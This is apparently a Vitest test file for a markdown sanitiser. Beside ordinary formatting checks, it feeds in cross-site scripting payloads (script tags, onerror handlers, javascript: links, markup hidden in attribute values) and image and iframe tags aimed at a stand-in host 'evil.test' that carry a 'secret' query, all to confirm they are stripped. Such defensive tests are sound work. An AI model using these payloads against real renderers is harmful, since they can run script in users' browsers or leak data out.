import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

/** What the sanitised tree comes to when it is written out, so one string shows the markup a test is about. */
function htmlOf(markdown: string): string {
  const holder = document.createElement('div')
  holder.append(renderMarkdown(markdown))
  return holder.innerHTML
}

describe('renderMarkdown', () => {
  it('renders bold text and lists', () => {
    const html = htmlOf('**Unit A-203**\n\n- first\n- second')

    expect(html).toContain('<strong>Unit A-203</strong>')
    expect(html).toContain('<li>first</li>')
  })

  it('renders GitHub-style tables', () => {
    const html = htmlOf('| Month | Status |\n|---|---|\n| 2026-10 | UNPAID |')

    expect(html).toContain('<table>')
    expect(html).toContain('<td>UNPAID</td>')
  })

  it('keeps single line breaks, which the offline assistant relies on', () => {
    expect(htmlOf('line one\nline two')).toContain('<br>')
  })

  it('lets a quoted clause take its own direction, whatever language the answer around it is in', () => {
    const html = htmlOf('> **5. Late payment**\n> Rent that is late carries a fee.')

    expect(html).toContain('<blockquote dir="auto">')
  })

  it('draws no image, whatever way it is written, so nothing is fetched by an answer', () => {
    const tree = renderMarkdown(
      '![x](https://evil.test/p.png?q=secret) <img src="https://evil.test/a.png"> '
        + '<picture><source srcset="https://evil.test/b.png"></picture> <video src="https://evil.test/c.mp4"></video> '
        + '<iframe src="https://evil.test"></iframe> <link rel="stylesheet" href="https://evil.test/s.css">',
    )

    expect(tree.querySelector('img, picture, source, video, audio, iframe, object, embed, link, style')).toBeNull()
    const holder = document.createElement('div')
    holder.append(tree)
    expect(holder.innerHTML).not.toContain('evil.test/p.png')
  })

  it('keeps a link, opens it in a new tab and hands over nothing of the page', () => {
    const tree = renderMarkdown('[the docs](https://example.test/docs) and <a href="https://example.test/x">x</a>')

    const links = [...tree.querySelectorAll('a')]
    expect(links).toHaveLength(2)
    for (const link of links) {
      expect(link.getAttribute('target')).toBe('_blank')
      expect(link.getAttribute('rel')).toBe('noopener noreferrer')
    }
  })

  it('renders Arabic text unchanged', () => {
    expect(htmlOf('**أحمد الحربي**')).toContain('<strong>أحمد الحربي</strong>')
  })

  it('strips scripts, event handlers and javascript: links', () => {
    const html = htmlOf('hi <script>alert(1)</script> <img src=x onerror="alert(2)"> [click](javascript:alert(3))')

    expect(html).not.toContain('<script')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('javascript:')
  })

  it('keeps markup inside the value of an attribute as the value, never as elements', () => {
    const tree = renderMarkdown('<span title="<table><img src=x onerror=alert(1)>">x</span>')

    expect(tree.querySelector('img, table')).toBeNull()
    expect(tree.querySelector('span')?.getAttribute('title')).toBe('<table><img src=x onerror=alert(1)>')
  })
})
